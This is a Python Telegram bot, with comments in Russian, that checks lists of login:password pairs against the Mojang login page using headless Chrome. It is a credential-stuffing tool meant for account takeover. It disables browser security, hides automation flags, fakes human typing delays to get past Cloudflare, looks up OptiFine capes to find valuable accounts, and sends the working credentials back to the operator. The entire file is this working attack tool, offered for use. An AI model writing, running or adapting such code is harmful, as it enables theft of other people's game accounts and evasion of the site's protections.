import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import requests

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'capes': 0,
    'migrated': 0,
    'start_time': datetime.now()
}

class SeleniumChecker:
    """Проверка аккаунтов через реальный браузер"""
    
    def __init__(self):
        self.driver = None
    
    def setup_driver(self):
        """Настраивает Chrome с отключенной безопасностью"""
        chrome_options = Options()
        
        # Отключаем режим безопасности (то что нужно!)
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--disable-features=VizDisplayCompositor')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('--disable-blink-features')
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--allow-running-insecure-content')
        chrome_options.add_argument('--disable-webgl')
        chrome_options.add_argument('--disable-software-rasterizer')
        
        # Маскируемся под реального пользователя
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # Для работы в контейнере (Railway)
        chrome_options.add_argument('--headless=new')  # Новый режим headless
        chrome_options.add_argument('--window-size=1920,1080')
        
        # Дополнительные настройки для обхода детекта
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Устанавливаем путь к ChromeDriver
        service = Service('/usr/local/bin/chromedriver')  # Путь для Railway
        
        try:
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            logger.error(f"Ошибка запуска Chrome: {e}")
            return False
    
    async def check_account(self, login, password):
        """Проверяет аккаунт через реальный браузер"""
        
        # Запускаем драйвер если еще не запущен
        if not self.driver:
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Не могу запустить Chrome'
                }
        
        try:
            logger.info(f"🔍 Проверяю: {login[:20]}...")
            
            # 1. Заходим на сайт Mojang
            self.driver.get('https://account.mojang.com/login')
            
            # Ждем загрузки страницы
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Небольшая задержка для имитации человека
            time.sleep(random.uniform(1, 3))
            
            # 2. Вводим логин и пароль
            try:
                # Ищем поля ввода (может отличаться на разных страницах)
                email_input = self.driver.find_element(By.NAME, "email")
                password_input = self.driver.find_element(By.NAME, "password")
                
                email_input.clear()
                email_input.send_keys(login)
                
                time.sleep(random.uniform(0.5, 1.5))
                
                password_input.clear()
                password_input.send_keys(password)
                
                time.sleep(random.uniform(0.5, 1.5))
                
                # 3. Отправляем форму
                submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                submit_button.click()
                
                # Ждем результат
                time.sleep(5)
                
                # Проверяем успешность входа
                current_url = self.driver.current_url
                page_source = self.driver.page_source
                
                # Если есть плащ на OptiFine, проверяем отдельно
                # Получаем ник из профиля
                if 'dashboard' in current_url or 'profile' in current_url:
                    # Пробуем найти ник
                    try:
                        username_element = self.driver.find_element(By.CSS_SELECTOR, ".profile-name, .username, .gamertag")
                        username = username_element.text.strip()
                    except:
                        # Если не нашли, пробуем получить из localStorage или cookies
                        username = self.driver.execute_script("return localStorage.getItem('username')") or "unknown"
                    
                    # Проверяем плащ на OptiFine
                    has_cape = await self.check_optifine_cape(username)
                    
                    return {
                        'login': login,
                        'password': password,
                        'username': username,
                        'status': 'valid',
                        'has_cape': has_cape,
                        'last_seen': 'сегодня'  # Раз зашли, значит сегодня
                    }
                
                # Проверяем наличие ошибок
                if 'error' in page_source.lower() or 'invalid' in page_source.lower():
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Неверный логин/пароль'
                    }
                
                if 'migrated' in page_source.lower():
                    return {
                        'login': login,
                        'status': 'migrated',
                        'error': 'Microsoft'
                    }
                
            except NoSuchElementException as e:
                logger.error(f"Не найдены поля ввода: {e}")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Страница изменилась'
                }
            
        except TimeoutException:
            logger.error("Таймаут загрузки страницы")
            return {
                'login': login,
                'status': 'error',
                'error': 'Таймаут'
            }
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    async def check_optifine_cape(self, username):
        """Проверяет наличие плаща на OptiFine"""
        try:
            # Прямая проверка через URL
            cape_url = f"https://optifine.net/capes/{username}.png"
            response = requests.get(cape_url, timeout=5)
            
            if response.status_code == 200:
                size = len(response.content)
                if size > 1000:  # Нормальный плащ > 1KB
                    logger.info(f"🔥 Найден плащ у {username}")
                    return True
            return False
        except:
            return False
    
    def close(self):
        """Закрывает браузер"""
        if self.driver:
            self.driver.quit()
            self.driver = None

# Создаем глобальный экземпляр
checker = SeleniumChecker()

async def process_file(file_path, update, context):
    """Обработка файла"""
    results = {
        'valid': [],
        'capes': [],
        'invalid': [],
        'migrated': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🔄 **Запускаю Chrome и начинаю проверку...**\n"
        "⏳ Это займет время, но Cloudflare не помешает!"
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    accounts.append((parts[0], parts[1]))
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Chrome запущен, проверяю...**"
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 2 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"🔥 **Плащей:** {len(results['capes'])}\n"
                    f"⏱ **Прошло:** {int(elapsed)}с\n\n"
                    f"🔄 **Проверяю:** {login[:20]}..."
                )
            
            # Проверка через Chrome
            result = await checker.check_account(login, password)
            
            # Сортируем
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['capes'].append(result)
                    bot_stats['capes'] += 1
                bot_stats['valid'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                bot_stats['invalid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            
            # Задержка между аккаунтами
            await asyncio.sleep(random.uniform(2, 4))
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с плащами
        if results['capes']:
            cape_file = f"🔥_ПЛАЩИ_{len(results['capes'])}шт_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥\n\n")
                for acc in results['capes']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc.get('username', 'неизвестно')}\n"
                        f"Последний вход: {acc.get('last_seen', 'сегодня')}\n"
                        f"{'='*40}\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Плащей: {len(results['capes'])}**"
                )
            os.remove(cape_file)
        
        # Файл с валидными
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• 🔥 С плащами: {len(results['capes'])}\n"
            f"• ❌ Неверных: {len(results['invalid'])}\n"
            f"• 🔄 Microsoft: {len(results['migrated'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **OptiFace Cape Checker (Chrome)**\n\n"
        f"🔍 **Проверяю через реальный браузер**\n"
        f"Cloudflare не блокирует!\n\n"
        f"📥 **Кидай .txt файл**\n"
        f"с логин:пароль\n\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено плащей: {bot_stats['capes']}\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Битых: {bot_stats['invalid']}\n"
            f"🔥 С плащами: {bot_stats['capes']}\n"
            f"🔄 Microsoft: {bot_stats['migrated']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n"
            "4️⃣ Chrome сам все проверит\n\n"
            "📌 **Пример:**\n"
            "`user@gmail.com:pass123`\n\n"
            "⚠️ **Важно:**\n"
            "• Проверка медленная (30-60 сек на аккаунт)\n"
            "• Зато Cloudflare не блокирует!\n"
            "• Chrome запускается 1 раз на всю проверку"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 5 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю Chrome и начинаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА!")
        return
    
    print("=" * 50)
    print("🚀 ЗАПУСК БОТА (Chrome + отключенная безопасность)")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ РАБОТАЕТ! Chrome готов...")
    
    try:
        app.run_polling()
    finally:
        # Закрываем Chrome при остановке
        checker.close()

if __name__ == '__main__':
    main()